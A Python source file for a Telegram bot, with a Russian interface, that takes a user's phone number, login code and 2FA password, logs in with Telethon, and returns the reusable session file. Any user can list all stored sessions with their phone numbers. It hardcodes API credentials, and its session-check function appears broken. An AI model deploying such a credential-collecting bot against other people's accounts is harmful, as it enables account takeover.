import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError
import asyncio
import threading

TOKEN = os.getenv('TOKEN')
API_ID = int(os.getenv('API_ID', '28537210'))
API_HASH = os.getenv('API_HASH', '5388b7e4bc869cce695b682f2644a160')

bot = telebot.TeleBot(TOKEN)

user_data = {}
sessions_cache = None

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop)

# ========== КЛАВИАТУРЫ ==========
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("🔑 Создать сессию"))
    markup.add(types.KeyboardButton("🔍 Проверить сессии"))
    return markup

def back_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("🔙 Главное меню"))
    return markup

def code_keyboard(uid):
    markup = types.InlineKeyboardMarkup(row_width=3)
    buttons = []
    for i in range(1, 10):
        buttons.append(types.InlineKeyboardButton(str(i), callback_data=f"code_{uid}_{i}"))
    buttons.append(types.InlineKeyboardButton("0", callback_data=f"code_{uid}_0"))
    buttons.append(types.InlineKeyboardButton("⌫", callback_data=f"code_{uid}_del"))
    buttons.append(types.InlineKeyboardButton("✅ Отправить", callback_data=f"code_{uid}_send"))
    
    for i in range(0, 9, 3):
        markup.row(*buttons[i:i+3])
    markup.row(buttons[9], buttons[10], buttons[11])
    return markup

# ========== ПРОВЕРКА СЕССИЙ ==========
def check_all_sessions():
    global sessions_cache
    session_folder = os.getcwd()
    sessions = [f for f in os.listdir(session_folder) if f.endswith('.session')]
    
    result = []
    for s in sessions:
        try:
            client = TelegramClient(s, API_ID, API_HASH)
            client.connect()
            me = client.get_me()
            client.disconnect()
            result.append(f"✅ {s} - {me.phone}")
        except Exception as e:
            result.append(f"❌ {s} - ошибка")
    sessions_cache = result
    return result

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    bot.send_message(uid, "🔐 Выберите действие:", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: m.text == "🔙 Главное меню")
def menu_back(m):
    bot.send_message(m.chat.id, "🔐 Выберите действие:", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: m.text == "🔍 Проверить сессии")
def check_sessions(m):
    uid = m.chat.id
    bot.send_message(uid, "⏳ Проверяю сессии...")
    result = check_all_sessions()
    text = "📋 **Результат проверки:**\n\n" + "\n".join(result)
    bot.send_message(uid, text, parse_mode="Markdown", reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: m.text == "🔑 Создать сессию")
def create_session_start(m):
    uid = m.chat.id
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📱 Отправить номер", request_contact=True)
    markup.add(btn)
    markup.add(types.KeyboardButton("🔙 Главное меню"))
    bot.send_message(uid, "📲 Отправьте номер телефона", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(m):
    uid = m.chat.id
    if not m.contact:
        bot.send_message(uid, "❌ Ошибка, попробуйте /start")
        return
    
    phone = m.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    
    user_data[uid] = {'phone': phone, 'code': '', 'step': 'code'}
    
    async def send_code():
        client = TelegramClient(f'session_{uid}', API_ID, API_HASH)
        user_data[uid]['client'] = client
        await client.connect()
        try:
            await client.send_code_request(phone)
            bot.send_message(uid, f"📲 Код отправлен на {phone}\nВведите кнопками:", reply_markup=code_keyboard(uid))
        except Exception as e:
            bot.send_message(uid, f"❌ Ошибка: {e}")
            await client.disconnect()
            del user_data[uid]
    
    run_async(send_code())

@bot.callback_query_handler(func=lambda call: call.data.startswith('code_'))
def handle_code_input(call):
    uid = call.from_user.id
    if uid not in user_data:
        return
    
    parts = call.data.split('_')
    action = parts[2]
    
    if action == 'del':
        user_data[uid]['code'] = user_data[uid]['code'][:-1]
    elif action == 'send':
        code = user_data[uid]['code']
        if len(code) != 5:
            bot.answer_callback_query(call.id, "❌ Код должен быть из 5 цифр")
            return
        bot.answer_callback_query(call.id)
        process_login(uid, code, call.message)
        return
    else:
        if len(user_data[uid]['code']) < 5:
            user_data[uid]['code'] += action
    
    try:
        bot.edit_message_text(
            f"🔢 Код: `{user_data[uid]['code']}`\n(5 цифр)", 
            call.message.chat.id, 
            call.message.message_id, 
            parse_mode="Markdown",
            reply_markup=code_keyboard(uid)
        )
    except:
        pass
    bot.answer_callback_query(call.id)

def process_login(uid, code, msg):
    if uid not in user_data:
        bot.send_message(uid, "❌ Ошибка")
        return
    
    client = user_data[uid]['client']
    phone = user_data[uid]['phone']
    
    async def login():
        try:
            await client.sign_in(phone, code)
            await finish_session(uid, client)
        except SessionPasswordNeededError:
            bot.send_message(uid, "🔐 Введите пароль от аккаунта (2FA):")
            bot.register_next_step_handler(msg, get_password)
        except FloodWaitError as e:
            bot.send_message(uid, f"⏳ Ждите {e.seconds} секунд")
            await client.disconnect()
            del user_data[uid]
        except Exception as e:
            bot.send_message(uid, f"❌ Ошибка: {e}")
            await client.disconnect()
            del user_data[uid]
    
    run_async(login())

def get_password(m):
    uid = m.chat.id
    password = m.text.strip()
    
    if uid not in user_data or 'client' not in user_data[uid]:
        bot.send_message(uid, "❌ Ошибка, начните заново /start")
        return
    
    client = user_data[uid]['client']
    
    async def login_with_password():
        try:
            await client.sign_in(password=password)
            await finish_session(uid, client)
        except Exception as e:
            bot.send_message(uid, f"❌ Ошибка: {e}")
            await client.disconnect()
            del user_data[uid]
    
    run_async(login_with_password())

async def finish_session(uid, client):
    await client.disconnect()
    
    session_file = f'session_{uid}.session'
    if os.path.exists(session_file):
        with open(session_file, 'rb') as f:
            bot.send_document(uid, f, caption="✅ Сессия создана! Файл во вложении")
        os.remove(session_file)
    
    markup = main_keyboard()
    bot.send_message(uid, "✅ Готово", reply_markup=markup)
    
    if uid in user_data:
        del user_data[uid]

def start_loop():
    loop.run_forever()

threading.Thread(target=start_loop, daemon=True).start()

print("🚀 Бот запущен (создание + проверка сессий)")
bot.infinity_polling()
